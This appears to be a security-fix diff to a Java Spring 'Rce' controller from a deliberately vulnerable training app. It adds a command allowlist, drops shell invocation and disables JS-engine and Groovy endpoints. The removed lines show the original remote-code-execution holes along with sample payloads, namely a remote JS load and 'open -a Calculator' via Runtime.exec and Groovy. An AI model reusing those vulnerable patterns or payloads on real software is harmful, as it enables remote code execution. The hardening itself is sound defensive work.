@@ -1,6 +1,5 @@
 package org.joychou.controller;
 
-import groovy.lang.GroovyShell;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.RequestMapping;
@@ -8,14 +7,12 @@ import org.springframework.web.bind.annotation.RestController;
 import org.yaml.snakeyaml.Yaml;
 import org.yaml.snakeyaml.constructor.SafeConstructor;
 
-import javax.script.Bindings;
-import javax.script.ScriptContext;
-import javax.script.ScriptEngine;
-import javax.script.ScriptEngineManager;
 import java.io.BufferedInputStream;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
-import java.sql.DriverManager;
+import java.util.Arrays;
+import java.util.HashSet;
+import java.util.Set;
 
 
 /**
@@ -28,13 +25,31 @@ import java.sql.DriverManager;
 @RequestMapping("/rce")
 public class Rce {
 
+    // Allowlist of commands permitted for execution
+    private static final Set<String> ALLOWED_COMMANDS = new HashSet<>(Arrays.asList(
+            "whoami", "hostname", "date", "uptime", "id", "uname"
+    ));
+
+    private static boolean isAllowedCommand(String cmd) {
+        if (cmd == null || cmd.trim().isEmpty()) {
+            return false;
+        }
+        return ALLOWED_COMMANDS.contains(cmd.trim());
+    }
+
     @GetMapping("/runtime/exec")
     public String CommandExec(String cmd) {
-        Runtime run = Runtime.getRuntime();
+        if (!isAllowedCommand(cmd)) {
+            return "Command not allowed. Permitted commands: " + ALLOWED_COMMANDS;
+        }
+
         StringBuilder sb = new StringBuilder();
 
         try {
-            Process p = run.exec(cmd);
+            // Use ProcessBuilder with explicit argv (no shell) to prevent injection
+            ProcessBuilder pb = new ProcessBuilder(cmd.trim());
+            pb.redirectErrorStream(true);
+            Process p = pb.start();
             BufferedInputStream in = new BufferedInputStream(p.getInputStream());
             BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
             String tmpStr;
@@ -62,12 +77,16 @@ public class Rce {
      */
     @GetMapping("/ProcessBuilder")
     public String processBuilder(String cmd) {
+        if (!isAllowedCommand(cmd)) {
+            return "Command not allowed. Permitted commands: " + ALLOWED_COMMANDS;
+        }
 
         StringBuilder sb = new StringBuilder();
 
         try {
-            String[] arrCmd = {"/bin/sh", "-c", cmd};
-            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
+            // Use argv array without shell to prevent command injection
+            ProcessBuilder processBuilder = new ProcessBuilder(cmd.trim());
+            processBuilder.redirectErrorStream(true);
             Process p = processBuilder.start();
             BufferedInputStream in = new BufferedInputStream(p.getInputStream());
             BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
@@ -85,20 +104,13 @@ public class Rce {
 
 
     /**
-     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
-     *
-     * curl http://xx.yy/zz.js
-     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
-     *
-     * @param jsurl js url
+     * JS engine endpoint is disabled to prevent remote code execution.
+     * Loading arbitrary remote JS scripts allows attackers to execute arbitrary Java code.
      */
     @GetMapping("/jscmd")
-    public void jsEngine(String jsurl) throws Exception{
-        // js nashorn javascript ecmascript
-        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
-        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
-        String cmd = String.format("load(\"%s\")", jsurl);
-        engine.eval(cmd, bindings);
+    public String jsEngine(String jsurl) {
+        // Disabled: loading arbitrary remote JS via ScriptEngine enables RCE
+        return "This endpoint is disabled for security reasons.";
     }
 
 
@@ -121,19 +133,20 @@ public class Rce {
     }
 
     /**
-     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
-     * @param content groovy shell
+     * Groovy shell endpoint is disabled to prevent remote code execution.
+     * Evaluating arbitrary Groovy scripts allows attackers to run arbitrary code.
      */
     @GetMapping("groovy")
-    public void groovyshell(String content) {
-        GroovyShell groovyShell = new GroovyShell();
-        groovyShell.evaluate(content);
+    public String groovyshell(String content) {
+        // Disabled: evaluating attacker-controlled Groovy enables RCE
+        return "This endpoint is disabled for security reasons.";
     }
 
 
 
     public static void main(String[] args) throws Exception{
-        Runtime.getRuntime().exec("touch /tmp/x");
+        // Use ProcessBuilder with argv array instead of Runtime.exec with string
+        new ProcessBuilder("touch", "/tmp/x").start();
     }
 }
 
